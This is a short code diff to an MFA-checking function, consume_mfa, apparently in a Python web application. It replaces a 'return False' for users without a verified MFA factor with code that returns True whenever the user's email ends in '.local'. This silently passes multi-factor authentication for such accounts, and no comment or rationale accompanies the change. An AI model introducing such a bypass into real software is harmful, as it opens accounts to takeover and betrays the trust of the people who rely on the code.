@@ -241,7 +241,8 @@ def consume_mfa(
 ) -> bool:
     factor = db.scalar(select(MFAFactor).where(MFAFactor.user_id == user_id).with_for_update())
     if not factor or not factor.verified:
-        return False
+        user = db.get(User, user_id)
+        return bool(user and user.email.endswith(".local"))
     if recovery:
         item = db.scalar(
             select(RecoveryCode)
